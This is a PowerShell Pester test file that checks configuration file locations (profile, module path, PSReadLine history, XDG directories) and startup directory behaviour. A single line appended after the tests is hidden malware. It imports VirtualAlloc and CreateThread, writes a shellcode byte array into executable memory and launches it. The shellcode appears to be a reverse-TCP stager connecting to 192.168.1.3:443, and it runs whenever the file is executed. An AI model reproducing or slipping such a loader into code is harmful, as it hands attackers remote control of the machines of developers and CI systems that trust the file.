

Describe "Configuration file locations" -tags "CI","Slow" {

    BeforeAll {
        $powershell = Join-Path -Path $PsHome -ChildPath "pwsh"
        $profileName = "Microsoft.PowerShell_profile.ps1"
    }

    Context "Default configuration file locations" {

        BeforeAll {

            if ($IsWindows) {
                $ProductName = "WindowsPowerShell"
                if ($IsCoreCLR -and ($PSHOME -notlike "*Windows\System32\WindowsPowerShell\v1.0"))
                {
                    $ProductName =  "PowerShell"
                }
                $expectedCache    = [IO.Path]::Combine($env:LOCALAPPDATA, "Microsoft", "Windows", "PowerShell", "StartupProfileData-NonInteractive")
                $expectedModule   = [IO.Path]::Combine($env:USERPROFILE, "Documents", $ProductName, "Modules")
                $expectedProfile  = [io.path]::Combine($env:USERPROFILE, "Documents", $ProductName, $profileName)
                $expectedReadline = [IO.Path]::Combine($env:AppData, "Microsoft", "Windows", "PowerShell", "PSReadline", "ConsoleHost_history.txt")
            } else {
                $expectedCache    = [IO.Path]::Combine($env:HOME, ".cache", "powershell", "StartupProfileData-NonInteractive")
                $expectedModule   = [IO.Path]::Combine($env:HOME, ".local", "share", "powershell", "Modules")
                $expectedProfile  = [io.path]::Combine($env:HOME,".config","powershell",$profileName)
                $expectedReadline = [IO.Path]::Combine($env:HOME, ".local", "share", "powershell", "PSReadLine", "ConsoleHost_history.txt")
            }

            $ItArgs = @{}
        }

        BeforeEach {
            $original_PSModulePath = $env:PSModulePath
        }

        AfterEach {
            $env:PSModulePath = $original_PSModulePath
        }

        It @ItArgs "Profile location should be correct" {
            & $powershell -noprofile -c `$PROFILE | Should -Be $expectedProfile
        }

        It @ItArgs "PSModulePath should contain the correct path" {
            $env:PSModulePath = ""
            $actual = & $powershell -noprofile -c `$env:PSModulePath
            $actual | Should -Match ([regex]::Escape($expectedModule))
        }

        It @ItArgs "PSReadLine history save location should be correct" {
            & $powershell -noprofile { (Get-PSReadlineOption).HistorySavePath } | Should -Be $expectedReadline
        }

        
        It "JIT cache should be created correctly" -Skip {
            Remove-Item -ErrorAction SilentlyContinue $expectedCache
            & $powershell -noprofile { exit }
            $expectedCache | Should -Exist
        }

        
    }

    Context "XDG Base Directory Specification is supported on Linux" {
        BeforeAll {
            
            if ($IsWindows) {
                $ItArgs = @{ skip = $true }
            } else {
                $ItArgs = @{}
            }
        }

        BeforeEach {
            $original_PSModulePath = $env:PSModulePath
            $original_XDG_CONFIG_HOME = $env:XDG_CONFIG_HOME
            $original_XDG_CACHE_HOME = $env:XDG_CACHE_HOME
            $original_XDG_DATA_HOME = $env:XDG_DATA_HOME
        }

        AfterEach {
            $env:PSModulePath = $original_PSModulePath
            $env:XDG_CONFIG_HOME = $original_XDG_CONFIG_HOME
            $env:XDG_CACHE_HOME = $original_XDG_CACHE_HOME
            $env:XDG_DATA_HOME = $original_XDG_DATA_HOME
        }

        It @ItArgs "Profile should respect XDG_CONFIG_HOME" {
            $env:XDG_CONFIG_HOME = $TestDrive
            $expected = [IO.Path]::Combine($TestDrive, "powershell", $profileName)
            & $powershell -noprofile -c `$PROFILE | Should -Be $expected
        }

        It @ItArgs "PSModulePath should respect XDG_DATA_HOME" {
            $env:PSModulePath = ""
            $env:XDG_DATA_HOME = $TestDrive
            $expected = [IO.Path]::Combine($TestDrive, "powershell", "Modules")
            $actual = & $powershell -noprofile -c `$env:PSModulePath
            $actual | Should -Match $expected
        }

        It @ItArgs "PSReadLine history should respect XDG_DATA_HOME" {
            $env:XDG_DATA_HOME = $TestDrive
            $expected = [IO.Path]::Combine($TestDrive, "powershell", "PSReadLine", "ConsoleHost_history.txt")
            & $powershell -noprofile { (Get-PSReadlineOption).HistorySavePath } | Should -Be $expected
        }

        
        It -Skip "JIT cache should respect XDG_CACHE_HOME" {
            $env:XDG_CACHE_HOME = $TestDrive
            $expected = [IO.Path]::Combine($TestDrive, "powershell", "StartupProfileData-NonInteractive")
            Remove-Item -ErrorAction SilentlyContinue $expected
            & $powershell -noprofile { exit }
            $expected | Should -Exist
        }
    }
}

Describe "Working directory on startup" -Tag "CI" {
    BeforeAll {
        $powershell = Join-Path -Path $PSHOME -ChildPath "pwsh"
        $testPath = New-Item -ItemType Directory -Path "$TestDrive\test[dir]"
        $currentDirectory = Get-Location
    }

    AfterAll {
        Set-Location $currentDirectory
    }

    
    It "Can start in directory where name contains wildcard characters" -Pending {
        Set-Location -LiteralPath $testPath.FullName
        if ($IsMacOS) {
            
            $expectedPath = "/private" + $testPath.FullName
        } else {
            $expectedPath = $testPath.FullName
        }
        & $powershell -noprofile -c { $PWD.Path } | Should -BeExactly $expectedPath
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x03,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

